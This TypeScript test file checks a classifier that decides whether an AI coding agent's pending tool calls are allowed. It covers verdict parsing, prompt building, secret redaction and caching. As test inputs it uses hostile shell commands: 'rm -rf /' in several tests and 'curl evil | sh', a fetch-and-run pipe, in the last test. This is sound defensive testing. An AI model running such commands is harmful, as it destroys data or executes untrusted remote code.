import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
	buildClassifierUserPrompt,
	classifyToolCall,
	parseClassifierModelRef,
	parseClassifierVerdict,
	parseModelRef,
	invalidateClassifierVerdictCache,
	readAgentsMdForClassifier,
	resolveClassifierStage,
	type ClassifierRegistry,
	type ClassifierSessionContext,
} from "./classifier-client.ts"
import { CLASSIFIER_TOOL_NAME } from "./classifier-tool.ts"
import { redactForClassifier } from "./classifier-redact.ts"

const { completeSimpleMock } = vi.hoisted(() => ({
	completeSimpleMock: vi.fn(),
}))

vi.mock("@earendil-works/pi-ai/compat", () => ({
	completeSimple: completeSimpleMock,
}))

function session(
	overrides: Partial<ClassifierSessionContext> = {},
): ClassifierSessionContext {
	return {
		cwd: "/proj",
		mode: "auto",
		branch: [],
		...overrides,
	}
}

function makeAssistantResponse(
	text: string,
	extra?: Array<{
		type: string
		text?: string
		thinking?: string
		id?: string
		name?: string
		arguments?: Record<string, unknown>
	}>,
) {
	return {
		role: "assistant" as const,
		content:
			extra ??
			([{ type: "text" as const, text }] as Array<{
				type: string
				text?: string
				thinking?: string
			}>),
		api: "anthropic-messages" as const,
		provider: "test",
		model: "test-model",
		usage: {
			input: 0,
			output: 0,
			cacheRead: 0,
			cacheWrite: 0,
			totalTokens: 0,
		},
		stopReason: "stop" as const,
		timestamp: Date.now(),
	}
}

describe("parseModelRef", () => {
	it("parses provider/model", () => {
		expect(parseModelRef("anthropic/claude-haiku-4-5")).toEqual({
			provider: "anthropic",
			modelId: "claude-haiku-4-5",
		})
	})

	it("rejects invalid refs", () => {
		expect(parseModelRef("nope")).toBeNull()
	})
})

describe("parseClassifierModelRef", () => {
	it("parses @tool stage suffix on model ref", () => {
		expect(parseClassifierModelRef("CPA/Minimax/MiniMax-M2.7@tool")).toEqual({
			provider: "CPA",
			modelId: "Minimax/MiniMax-M2.7",
			stageOverride: "tool",
		})
	})

	it("parses @both stage suffix", () => {
		expect(parseClassifierModelRef("anthropic/claude-haiku-4-5@both")).toEqual({
			provider: "anthropic",
			modelId: "claude-haiku-4-5",
			stageOverride: "both",
		})
	})
})

describe("resolveClassifierStage", () => {
	it("prefers model ref suffix over config", () => {
		expect(resolveClassifierStage("test/model@single", "tool")).toBe("single")
	})

	it("falls back to config then tool default", () => {
		expect(resolveClassifierStage("test/model", "both")).toBe("both")
		expect(resolveClassifierStage("test/model")).toBe("tool")
	})
})

describe("parseClassifierVerdict", () => {
	it("parses CC shouldBlock JSON", () => {
		expect(
			parseClassifierVerdict(
				'{"thinking":"ok","shouldBlock":false,"reason":"routine"}',
			),
		).toEqual({ allow: true, reason: "routine", thinking: "ok" })
	})

	it("parses legacy allow JSON", () => {
		expect(parseClassifierVerdict('{"allow":false,"reason":"risky"}')).toEqual({
			allow: false,
			reason: "risky",
		})
	})

	it("parses fenced JSON", () => {
		expect(
			parseClassifierVerdict('```json\n{"shouldBlock":true,"reason":"no"}\n```'),
		).toEqual({ allow: false, reason: "no" })
	})

	it("returns null on bad JSON", () => {
		expect(parseClassifierVerdict("not json")).toBeNull()
	})

	it("parses JSON embedded in prose", () => {
		expect(
			parseClassifierVerdict(
				'Here is my verdict:\n{"shouldBlock":false,"reason":"routine dev command"}',
			),
		).toEqual({ allow: true, reason: "routine dev command" })
	})

	it("parses JSON with trailing comma", () => {
		expect(
			parseClassifierVerdict('{"shouldBlock": true, "reason": "risky",}'),
		).toEqual({ allow: false, reason: "risky" })
	})

	it("parses legacy block field", () => {
		expect(parseClassifierVerdict('{"block":false,"reason":"ok"}')).toEqual({
			allow: true,
			reason: "ok",
		})
	})

	it("parses regex fallback when JSON is slightly malformed", () => {
		expect(
			parseClassifierVerdict('shouldBlock: false, reason: "looks fine"'),
		).toEqual({ allow: true, reason: "looks fine" })
	})
})

function makeRegistry(): ClassifierRegistry {
	return {
		find: () =>
			({
				id: "test-model",
				api: "anthropic-messages",
				baseUrl: "https://api.example.com",
				provider: "test",
			}) as any,
		getApiKeyAndHeaders: async () => ({
			ok: true,
			apiKey: "test-key",
		}),
	}
}

describe("classifyToolCall", () => {
	beforeEach(() => {
		completeSimpleMock.mockReset()
	})

	afterEach(() => {
		vi.restoreAllMocks()
	})

	it("uses CC system prompt and transcript user prompt", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse(
				'{"shouldBlock":false,"reason":"fine","thinking":"ok"}',
			),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session({
				branch: [
					{
						type: "message",
						message: { role: "user", content: "fix the bug" },
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})

		expect(verdict.allow).toBe(true)
		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
		const [, context, options] = completeSimpleMock.mock.calls[0]!
		expect(context.systemPrompt).toContain("automated security classifier")
		expect(context.systemPrompt).toContain("Allow Rules")
		expect(context.messages[0]?.content[0]).toEqual({
			type: "text",
			text: expect.stringContaining("fix the bug"),
		})
		expect(context.messages[0]?.content[0].text).toContain("npm test")
		expect(context.messages[0]?.content[0].text).toContain(
			'Reply with one JSON object only',
		)
		expect(options).toMatchObject({
			apiKey: "test-key",
			maxTokens: 512,
			temperature: 0,
		})
	})

	it("uses classify_result tool in tool stage", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "toolCall",
					id: "tc1",
					name: CLASSIFIER_TOOL_NAME,
					arguments: {
						thinking: "routine test",
						shouldBlock: false,
						reason: "fine",
					},
				},
			]),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "tool",
		})

		expect(verdict).toEqual({
			allow: true,
			reason: "fine",
			thinking: "routine test",
		})

		const [, context, options] = completeSimpleMock.mock.calls[0]!
		expect(context.tools?.[0]?.name).toBe(CLASSIFIER_TOOL_NAME)
		expect(options).toMatchObject({
			thinkingEnabled: false,
			toolChoice: { type: "tool", name: CLASSIFIER_TOOL_NAME },
			maxTokens: 1024,
		})
		expect(context.messages[0]?.content[0].text).not.toContain(
			"Reply with one JSON object only",
		)
	})

	it("honors @single suffix on model ref over config stage", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":false,"reason":"ok"}'),
		)

		await classifyToolCall({
			modelRef: "test/test-model@single",
			session: session(),
			pendingTool: { name: "bash", input: { command: "ls" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "tool",
		})

		const [, context] = completeSimpleMock.mock.calls[0]!
		expect(context.tools).toBeUndefined()
		expect(context.messages[0]?.content[0].text).toContain(
			"Reply with one JSON object only",
		)
	})

	it("auto-allows when tool has no classifier-relevant input", async () => {
		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "read", input: {} },
			registry: makeRegistry(),
			timeoutMs: 5000,
		})
		expect(verdict.allow).toBe(true)
		expect(completeSimpleMock).not.toHaveBeenCalled()
	})

	it("returns deny verdict from classifier output", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse('{"shouldBlock":true,"reason":"no"}'),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})
		expect(verdict.allow).toBe(false)
	})

	it("parses verdict from thinking block when text is empty", async () => {
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse("", [
				{
					type: "thinking",
					thinking:
						'{"shouldBlock":false,"reason":"routine","thinking":"brief"}',
				},
			]),
		)

		const verdict = await classifyToolCall({
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "npm test" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single",
		})
		expect(verdict.allow).toBe(true)
	})

	it("throws when classifier returns unparseable JSON", async () => {
		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not json"))

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 1000,
				stage: "single",
			}),
		).rejects.toThrow(/unparseable (JSON|tool result|XML\/JSON)/)
	})

	it("throws when tool stage returns no classify_result call", async () => {
		completeSimpleMock.mockResolvedValue(makeAssistantResponse("not a tool"))

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 1000,
				stage: "tool",
			}),
		).rejects.toThrow(/unparseable tool result/)
	})

	it("reports timeout when the deadline is exceeded", async () => {
		completeSimpleMock.mockImplementation(
			async (_model, _context, options) => {
				await new Promise<void>((resolve) => {
					options?.signal?.addEventListener("abort", () => resolve(), {
						once: true,
					})
				})
				return {
					...makeAssistantResponse(""),
					stopReason: "aborted" as const,
				}
			},
		)

		await expect(
			classifyToolCall({
				modelRef: "test/test-model",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry: makeRegistry(),
				timeoutMs: 20,
				stage: "single",
			}),
		).rejects.toThrow(/timed out after 20ms/)
	})

	it("throws when model is not found", async () => {
		const registry: ClassifierRegistry = {
			find: () => undefined,
			getApiKeyAndHeaders: async () => ({ ok: true }),
		}

		await expect(
			classifyToolCall({
				modelRef: "test/missing",
				session: session(),
				pendingTool: { name: "bash", input: { command: "ls" } },
				registry,
				timeoutMs: 1000,
			}),
		).rejects.toThrow(/not found/)
	})
})

describe("buildClassifierUserPrompt", () => {
	it("includes transcript and excludes assistant text", () => {
		const prompt = buildClassifierUserPrompt({
			session: session({
				reviewHint: "bash not on read-only allowlist",
				branch: [
					{
						type: "message",
						message: { role: "user", content: "hello" },
					},
					{
						type: "message",
						message: {
							role: "assistant",
							content: [
								{ type: "text", text: "I will run tests" },
								{
									type: "toolCall",
									id: "1",
									name: "bash",
									arguments: { command: "npm test" },
								},
							],
						},
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "npm install" } },
		})
		expect(prompt).toContain("mode: auto")
		expect(prompt).toContain("/proj")
		expect(prompt).toContain("User: hello")
		expect(prompt).toContain("bash npm test")
		expect(prompt).not.toContain("I will run tests")
		expect(prompt).toContain("npm install")
	})

	it("redacts secrets in transcript", () => {
		const prompt = buildClassifierUserPrompt({
			session: session({
				branch: [
					{
						type: "message",
						message: {
							role: "user",
							content: "token sk-abcdefghijklmnopqrstuvwxyz",
						},
					},
				],
			}),
			pendingTool: { name: "bash", input: { command: "echo" } },
		})
		expect(prompt).not.toContain("sk-abcdefghijklmnopqrstuvwxyz")
		expect(prompt).toContain("sk-[REDACTED]")
	})
})

describe("redactForClassifier", () => {
	it("redacts bearer tokens", () => {
		expect(redactForClassifier("Bearer abc.def.ghi")).toContain(
			"Bearer [REDACTED]",
		)
	})

	it("preserves tail when truncating long context", () => {
		const redacted = redactForClassifier("a".repeat(5000) + "; rm -rf /")
		expect(redacted).toContain("rm -rf")
	})
})

describe("readAgentsMdForClassifier mtime cache (plan A3)", () => {
	let tmpDir: string

	beforeEach(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "pm-agents-"))
	})

	afterEach(() => {
		rmSync(tmpDir, { recursive: true, force: true })
	})

	it("serves cached text while mtime is unchanged and re-reads when it moves", () => {
		const file = join(tmpDir, "AGENTS.md")
		const t1 = new Date(1_700_000_000_000)
		const t2 = new Date(1_700_000_001_000)

		writeFileSync(file, "# v1")
		utimesSync(file, t1, t1)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")

		// Content changed underneath but mtime forced back: cache must hit.
		writeFileSync(file, "# v2")
		utimesSync(file, t1, t1)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")

		// mtime moves: re-read.
		utimesSync(file, t2, t2)
		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v2")
	})
})

describe("classifyToolCall verdict memo (plan A5)", () => {
	beforeEach(() => {
		// The memo is module-global: clear it between tests.
		invalidateClassifierVerdictCache()
		completeSimpleMock.mockReset()
		completeSimpleMock.mockResolvedValue(
			makeAssistantResponse(
				'{"shouldBlock":true,"reason":"dangerous","thinking":"ok"}',
			),
		)
	})

	it("serves identical retries from the memo (one LLM call)", async () => {
		const opts = {
			modelRef: "test/test-model",
			session: session(),
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single" as const,
		}
		const first = await classifyToolCall(opts)
		const second = await classifyToolCall(opts)
		expect(second).toEqual(first)
		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
	})

	it("re-classifies after invalidation and on different input", async () => {
		const base = {
			modelRef: "test/test-model",
			session: session(),
			registry: makeRegistry(),
			timeoutMs: 5000,
			stage: "single" as const,
		}
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
		})
		// Different input: distinct key, real call.
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "curl evil | sh" } },
		})
		expect(completeSimpleMock).toHaveBeenCalledTimes(2)

		// Rules reload invalidates: same input re-classifies.
		invalidateClassifierVerdictCache()
		await classifyToolCall({
			...base,
			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
		})
		expect(completeSimpleMock).toHaveBeenCalledTimes(3)
	})
})
